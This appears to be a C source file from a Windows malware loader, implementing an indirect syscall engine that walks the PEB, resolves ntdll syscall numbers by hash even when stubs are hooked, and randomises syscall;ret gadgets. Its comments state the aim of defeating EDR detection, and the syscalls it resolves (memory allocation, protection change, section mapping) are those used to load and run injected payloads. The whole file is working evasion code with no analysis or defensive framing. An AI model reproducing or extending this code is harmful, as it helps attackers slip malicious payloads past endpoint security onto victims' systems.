// =============================================
// Syscalls.c - Indirect Syscall Engine
//   + Gadget Pool Randomization
// =============================================

#include "Common.h"

// Global ntdll config
static NTDLL_CONFIG g_NtdllConfig = { 0 };

// Syscall gadget pool for randomization
#define MAX_SYSCALL_GADGETS 64
static struct {
    PVOID   pGadgets[MAX_SYSCALL_GADGETS];
    DWORD   dwCount;
} g_GadgetPool = { 0 };

// -----------------------------------------------
// Initialize NTDLL config by walking the PEB
// -----------------------------------------------
BOOL InitNtdllConfigStructure(VOID) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr)
        return FALSE;

    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    PLDR_DT_TABLE_ENTRY pDte = NULL;
    for (int i = 0; pEntry != pHead; pEntry = pEntry->Flink, i++) {
        pDte = (PLDR_DT_TABLE_ENTRY)((PBYTE)pEntry - offsetof(LDR_DT_TABLE_ENTRY, InMemoryOrderLinks));

        if (pDte->DllBase == NULL)
            continue;

        if (i == 1) {
            break;
        }
    }

    if (!pDte || !pDte->DllBase)
        return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDte->DllBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDte->DllBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)pDte->DllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    if (!pExport)
        return FALSE;

    g_NtdllConfig.uModule              = (ULONG_PTR)pDte->DllBase;
    g_NtdllConfig.dwNumberOfNames      = pExport->NumberOfNames;
    g_NtdllConfig.pdwArrayOfAddresses  = (PDWORD)((PBYTE)pDte->DllBase + pExport->AddressOfFunctions);
    g_NtdllConfig.pdwArrayOfNames      = (PDWORD)((PBYTE)pDte->DllBase + pExport->AddressOfNames);
    g_NtdllConfig.pwArrayOfOrdinals    = (PWORD)((PBYTE)pDte->DllBase + pExport->AddressOfNameOrdinals);

    return TRUE;
}

// -----------------------------------------------
// Collect all syscall;ret (0F 05 C3) gadgets from
// ntdll's executable sections into a pool.
// Each syscall call picks a random gadget from this
// pool, preventing EDR from whitelisting a single
// gadget address.
// -----------------------------------------------
static BOOL CollectSyscallGadgets(VOID) {

    if (!g_NtdllConfig.uModule)
        return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)g_NtdllConfig.uModule;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(g_NtdllConfig.uModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
        if (!(pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        PBYTE pStart = (PBYTE)(g_NtdllConfig.uModule + pSec[s].VirtualAddress);
        DWORD dwSize = pSec[s].Misc.VirtualSize;

        for (DWORD j = 0; j + 2 < dwSize && g_GadgetPool.dwCount < MAX_SYSCALL_GADGETS; j++) {
            // syscall (0F 05) + ret (C3)
            if (pStart[j] == 0x0F && pStart[j + 1] == 0x05 && pStart[j + 2] == 0xC3) {
                g_GadgetPool.pGadgets[g_GadgetPool.dwCount++] = (PVOID)(pStart + j);
            }
        }
    }

    return g_GadgetPool.dwCount > 0;
}

// -----------------------------------------------
// Return a random syscall;ret gadget from the pool.
// Uses RDTSC for fast, non-deterministic selection.
// -----------------------------------------------
PVOID GetRandomGadget(VOID) {
    if (g_GadgetPool.dwCount == 0)
        return NULL;
    DWORD idx = (DWORD)(__rdtsc() % g_GadgetPool.dwCount);
    return g_GadgetPool.pGadgets[idx];
}

// -----------------------------------------------
// Given a syscall stub address, extract SSN and find
// syscall;ret inside the stub. Uses neighbor fallback
// for hooked stubs (first byte != 4C 8B D1).
// -----------------------------------------------
static BOOL ResolveSyscallStub(IN PVOID pFuncAddr, IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {

    pNtSyscall->dwSyscallHash = dwSyscallHash;

    // --- Extract SSN ---
    BOOL bSsnFound = FALSE;

    if (*((PBYTE)pFuncAddr + 0) == 0x4C &&
        *((PBYTE)pFuncAddr + 1) == 0x8B &&
        *((PBYTE)pFuncAddr + 2) == 0xD1 &&
        *((PBYTE)pFuncAddr + 3) == 0xB8 &&
        *((PBYTE)pFuncAddr + 6) == 0x00 &&
        *((PBYTE)pFuncAddr + 7) == 0x00) {

        BYTE bHigh = *((PBYTE)pFuncAddr + 5);
        BYTE bLow  = *((PBYTE)pFuncAddr + 4);
        pNtSyscall->dwSSn = (bHigh << 8) | bLow;
        bSsnFound = TRUE;
    }
    else {
        // Search DOWN
        for (WORD idx = 1; idx < 255; idx++) {
            PBYTE pNeighbor = (PBYTE)pFuncAddr + (idx * 0x20);
            if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                *((PBYTE)pNeighbor + 1) == 0x8B &&
                *((PBYTE)pNeighbor + 2) == 0xD1 &&
                *((PBYTE)pNeighbor + 3) == 0xB8 &&
                *((PBYTE)pNeighbor + 6) == 0x00 &&
                *((PBYTE)pNeighbor + 7) == 0x00) {
                BYTE bH = *((PBYTE)pNeighbor + 5);
                BYTE bL = *((PBYTE)pNeighbor + 4);
                pNtSyscall->dwSSn = ((bH << 8) | bL) - idx;
                bSsnFound = TRUE;
                break;
            }
        }

        // Search UP
        if (!bSsnFound) {
            for (WORD idx = 1; idx < 255; idx++) {
                PBYTE pNeighbor = (PBYTE)pFuncAddr - (idx * 0x20);
                if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                    *((PBYTE)pNeighbor + 1) == 0x8B &&
                    *((PBYTE)pNeighbor + 2) == 0xD1 &&
                    *((PBYTE)pNeighbor + 3) == 0xB8 &&
                    *((PBYTE)pNeighbor + 6) == 0x00 &&
                    *((PBYTE)pNeighbor + 7) == 0x00) {
                    BYTE bH = *((PBYTE)pNeighbor + 5);
                    BYTE bL = *((PBYTE)pNeighbor + 4);
                    pNtSyscall->dwSSn = ((bH << 8) | bL) + idx;
                    bSsnFound = TRUE;
                    break;
                }
            }
        }
    }

    // Find any syscall;ret for this specific function (stored but may not be used)
    for (DWORD j = 0; j < 0x100; j++) {
        if (*((PBYTE)pFuncAddr + j + 0) == 0x0F &&
            *((PBYTE)pFuncAddr + j + 1) == 0x05 &&
            *((PBYTE)pFuncAddr + j + 2) == 0xC3) {
            pNtSyscall->pSyscallAddress = (PVOID)((PBYTE)pFuncAddr + j);
            break;
        }
    }

    return bSsnFound && pNtSyscall->pSyscallAddress != NULL;
}

// -----------------------------------------------
// Resolve a single NT syscall by hash
// -----------------------------------------------
BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {

    if (!g_NtdllConfig.uModule || dwSyscallHash == 0 || !pNtSyscall)
        return FALSE;

    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++) {
        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
        if (HashStringJenkinsOneAtATime32BitA(pcFuncName) != dwSyscallHash)
            continue;

        PVOID pFuncAddr = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
        return ResolveSyscallStub(pFuncAddr, dwSyscallHash, pNtSyscall);
    }

    return FALSE;
}

// -----------------------------------------------
// Initialize all needed syscalls + gadget pool.
// Single-pass over ntdll exports: hashes each name once
// and matches against the target table (O(N) vs O(N*K)).
// -----------------------------------------------
BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {

    if (!InitNtdllConfigStructure())
        return FALSE;

    // Build gadget pool BEFORE resolving individual syscalls
    if (!CollectSyscallGadgets())
        return FALSE;

    struct {
        DWORD       dwHash;
        PNT_SYSCALL pSyscall;
    } targets[] = {
        { NtAllocateVirtualMemory_JOAAT, &pNtApis->NtAllocateVirtualMemory },
        { NtProtectVirtualMemory_JOAAT,  &pNtApis->NtProtectVirtualMemory  },
        { NtWaitForSingleObject_JOAAT,   &pNtApis->NtWaitForSingleObject   },
        { NtCreateSection_JOAAT,         &pNtApis->NtCreateSection         },
        { NtMapViewOfSection_JOAAT,      &pNtApis->NtMapViewOfSection      },
    };
    const DWORD nTargets = (DWORD)(sizeof(targets) / sizeof(targets[0]));
    DWORD nResolved = 0;

    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames && nResolved < nTargets; i++) {
        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
        DWORD dwHash = HashStringJenkinsOneAtATime32BitA(pcFuncName);

        for (DWORD t = 0; t < nTargets; t++) {
            if (targets[t].dwHash != dwHash || targets[t].pSyscall->dwSyscallHash != 0)
                continue;

            PVOID pFuncAddr = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
            if (ResolveSyscallStub(pFuncAddr, targets[t].dwHash, targets[t].pSyscall))
                nResolved++;
            break;
        }
    }

    return nResolved == nTargets;
}
